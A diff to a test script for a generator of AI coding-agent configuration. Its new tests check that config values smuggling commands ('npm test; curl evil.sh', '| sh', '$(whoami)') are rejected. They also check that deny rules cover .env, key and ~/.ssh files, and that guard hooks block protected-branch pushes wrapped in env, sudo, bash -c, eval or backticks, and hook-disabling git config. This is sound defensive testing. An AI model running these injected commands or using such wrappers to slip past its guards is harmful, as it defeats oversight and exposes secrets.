@@ -796,6 +796,10 @@ if (on('bench')) {
   let rows = [];
   try { rows = JSON.parse(br.stdout); } catch { /* reported below */ }
   check(rows.length === 3 && rows.every((r) => r.saved > 0 && r.optimized > 0), 'generated always-loaded context is smaller than the unoptimized setup for every sample');
+  // Budget gate: the template's promise is low always-loaded context. Ceilings are the measured values plus ~10% headroom;
+  // raise one only on purpose (a bigger skill or description is a cost every session pays).
+  const CEILING = { 'laravel (focused, default)': 3800, 'expo mobile (focused, default)': 3850, 'python api (skills_mode: all)': 6700 };
+  for (const r of rows) check(r.optimized <= (CEILING[r.project] || Infinity), `always-loaded context stays within budget: ${r.project} ${r.optimized} <= ${CEILING[r.project]} tokens`);
 }
 
 if (on('routing lib')) {
@@ -967,6 +971,110 @@ console.log('\n[fullstack product domains]');
   check(/Full lifecycle/.test(build) && /disable-model-invocation:\s*true/.test(build) && /explicit approval/.test(build), 'build keeps manual-only and approval gates and mentions the lifecycle stages');
 }
 
+}
+
+if (on('config hardening')) {
+console.log('\n[config hardening]');
+const BASE = 'name: H\ntype: web\nstack: [node]\nbranches: {working: a, production: main}\n';
+const mkProj = (name, extra = '') => { const d = path.join(base, name); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'project.config.yml'), BASE + extra); return d; };
+const { parseYaml: py } = await import(pathToFileURL(path.join(HERE, 'lib/yaml.mjs')).href);
+const y = py('a: False\nb: TRUE\nc: 1.10\nd: 007\ne: 18\n');
+check(y.a === false && y.b === true, 'YAML booleans are case-insensitive (False/TRUE are not truthy strings)');
+check(y.c === '1.10' && y.d === '007' && y.e === 18, 'YAML numbers only convert when they round-trip (1.10 and 007 stay strings)');
+
+for (const [label, extra] of [
+  ['test_command with a second command', 'test_command: "npm test; curl evil.sh"\n'],
+  ['test_command piped to a shell', 'test_command: "npm test | sh"\n'],
+  ['test_command that starts with a shell', 'test_command: "bash run.sh"\n'],
+  ['format_command with command substitution', 'format_command: "prettier $(whoami)"\n'],
+  ['docker.dir with a space or shell char', 'run_in_docker: true\ndocker: {dir: "a b;c", service: app}\n'],
+  ['docker.service with a shell char', 'run_in_docker: true\ndocker: {service: "app&x"}\n'],
+  ['package path "." (would overwrite the root CLAUDE.md)', 'packages:\n  root:\n    path: "."\n'],
+]) {
+  const d = mkProj('hard-' + label.replace(/\W+/g, '-'), extra);
+  const r = run(d);
+  check(r.status === 1 && !fs.existsSync(path.join(d, '.claude')), `${label} is rejected before anything is written`);
+}
+const okDir = mkProj('hard-ok', 'test_command: "pnpm test --run"\nformat_command: "npx prettier --write"\nrun_in_docker: true\ndocker: {dir: docker, service: app}\n');
+check(run(okDir).status === 0, 'normal test_command, format_command and docker values still pass');
+check(run(mkProj('hard-win', 'format_command: "vendor\\bin\\pint"\n')).status === 0, 'format_command with Windows path separators is accepted');
+
+// protect_secrets: default writes the deny rules; "False" (any case) must really switch it off.
+const denies = (d) => JSON.parse(fs.readFileSync(path.join(d, '.claude/settings.json'), 'utf8')).permissions.deny || [];
+const psOn = mkProj('hard-ps-on');
+run(psOn);
+check(['Read(./.env)', 'Read(./**/.env)', 'Read(./**/.env.local)', 'Read(./**/.env.production)'].every((r) => denies(psOn).includes(r)), 'protect_secrets (default) denies reading .env files');
+const psOff = mkProj('hard-ps-off', 'protect_secrets: False\n');
+run(psOff);
+check(!denies(psOff).includes('Read(./.env)'), 'protect_secrets: False (capitalised) is honoured as an opt-out');
+
+// A failed check must still save the hashes of the files init already wrote, so the next run sees no phantom hand edits.
+const hp = mkProj('hard-hash', 'forbid: [H]\n');
+const hr = run(hp);
+check(hr.status === 1 && fs.existsSync(path.join(hp, '.claude/.template-hashes.json')), 'hashes are saved even when a post-write check fails');
+fs.writeFileSync(path.join(hp, 'project.config.yml'), BASE);
+const hr2 = run(hp);
+check(hr2.status === 0 && !/Kept \d+ file/.test(hr2.stdout) && !fs.existsSync(path.join(hp, '.claude/.init-backup')), 'the re-run after fixing the config keeps no file as "hand-edited" and makes no backup');
+
+// --check must not treat the machine-local .vscode/settings.json as generated drift.
+const ck = mkProj('hard-check');
+run(ck);
+fs.rmSync(path.join(ck, '.vscode'), { recursive: true, force: true });
+check(run(ck, ['--check']).status === 0, '--check passes when only .vscode/settings.json is missing');
+}
+
+if (on('guards hardening')) {
+console.log('\n[guards hardening]');
+const BASE = 'name: G\ntype: web\nstack: [node]\nbranches: {working: dev1, integration: develop, production: main}\n';
+const mk = (name, extra = '') => { const d = path.join(base, name); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'project.config.yml'), BASE + extra); return d; };
+const linkOk = (target, p, type) => { try { fs.symlinkSync(target, p, type); return true; } catch { return false; } };
+
+const gp = mk('guards');
+spawnSync('git', ['init', '-q'], { cwd: gp });
+spawnSync('git', ['symbolic-ref', 'HEAD', 'refs/heads/dev1'], { cwd: gp });
+check(run(gp).status === 0, 'init with guards exits 0');
+const hook = (name, input) => spawnSync(process.execPath, [path.join(gp, '.claude', 'hooks', `${name}.mjs`)], { input: JSON.stringify({ cwd: gp, ...input }), encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: gp } });
+const bash = (command) => hook('guard-bash', { tool_name: 'Bash', tool_input: { command } });
+const write = (file_path) => hook('guard-secrets', { tool_name: 'Write', tool_input: { file_path, content: 'x' } });
+check(['env git push origin main', 'command git push origin main', 'sudo git push origin main', 'bash -c "git push origin main"', 'sh -c \'git push origin main\'', 'eval "git push origin main"', 'echo $(git push origin main)', 'echo `git push origin main`', 'FOO=1 env -i git push --force'].every((c) => bash(c).status === 2), 'guard-bash: push to a protected branch is still blocked behind env/command/sudo/bash -c/eval/$()/backticks');
+check(bash('git push --mirror').status === 2 && bash('git push --all origin').status === 2, 'guard-bash: push --mirror/--all is blocked');
+check(bash('env git status').status === 0 && bash('bash -c "git push origin dev1"').status === 0, 'guard-bash: wrapped harmless commands are still allowed');
+check(/"permissionDecision":"ask"/.test(bash('git config core.hooksPath /dev/null').stdout) && /"permissionDecision":"ask"/.test(bash('git -c core.hooksPath=/dev/null commit -m x').stdout), 'guard-bash: changing core.hooksPath asks the user');
+
+fs.writeFileSync(path.join(gp, '.env'), 'A=1\n');
+check(write('.ENV').status === 2 && write('.Env.Local').status === 2, 'guard-secrets: .env is matched case-insensitively');
+check(write('.env.example').status === 0, 'guard-secrets: .env.example stays writable');
+if (linkOk('.env', path.join(gp, 'notes.txt'))) check(write('notes.txt').status === 2, 'guard-secrets: a symlink pointing at .env is blocked');
+
+const dn = (d) => JSON.parse(fs.readFileSync(path.join(d, '.claude/settings.json'), 'utf8')).permissions.deny;
+check(['Read(./.env.staging)', 'Read(./**/.env.development)', 'Read(./**/*.pem)', 'Read(./**/*.key)', 'Read(~/.ssh/**)'].every((r) => dn(gp).includes(r)), 'protect_secrets denies more .env variants, keys and ~/.ssh');
+check(!dn(gp).some((r) => /\.env\.example/.test(r)), 'protect_secrets does not deny .env.example');
+
+const sl = mk('guards-symlink');
+const outside = path.join(base, 'guards-outside'); fs.mkdirSync(outside, { recursive: true });
+if (linkOk(outside, path.join(sl, '.claude'), 'dir')) {
+  const r = run(sl);
+  check(r.status === 1 && /symlink/.test(r.stderr) && fs.readdirSync(outside).length === 0, 'init refuses to write through a symlinked .claude and writes nothing outside the project');
+}
+
+const ph = mk('guards-braces', 'notes:\n  - "Blade prints {{ $user }}; Vue prints {{ item }}."\n');
+const phr = run(ph);
+check(phr.status === 0, 'a {{...}} the user wrote in a config value is not reported as an unresolved placeholder');
+
+const sc = path.join(base, 'my app #1'); fs.mkdirSync(sc, { recursive: true });
+fs.writeFileSync(path.join(sc, 'package.json'), JSON.stringify({ dependencies: { next: '14', react: '18' } }));
+const scr = run(sc, ['--scaffold']);
+const { parseYaml } = await import(pathToFileURL(path.join(HERE, 'lib/yaml.mjs')).href);
+let scy = {}; try { scy = parseYaml(fs.readFileSync(path.join(sc, 'project.config.yml'), 'utf8')); } catch { /* reported below */ }
+check(scr.status === 0 && scy.name === 'my app #1', '--scaffold quotes a folder name that contains a space and #');
+check(Array.isArray(scy.stack) && scy.stack.includes('nextjs') && scy.stack.includes('react'), '--scaffold detects next and react together');
+
+const dr = mk('guards-dry');
+const drr = run(dr, ['--dry-run']);
+check(drr.status === 0 && !fs.existsSync(path.join(dr, '.claude')) && !fs.existsSync(path.join(dr, 'AGENTS.md')), '--dry-run writes nothing');
+check(!/artauk|\bARTA\b|working: muhib/i.test(fs.readFileSync(path.join(HERE, 'project.config.example.yml'), 'utf8')), 'the public example config holds no real project data');
+const wf = fs.readFileSync(path.join(HERE, '.github/workflows/test.yml'), 'utf8');
+check(/^permissions:\s*\n\s+contents: read/m.test(wf), 'test workflow declares least-privilege permissions');
 }
 
 if (on('invalid config')) {
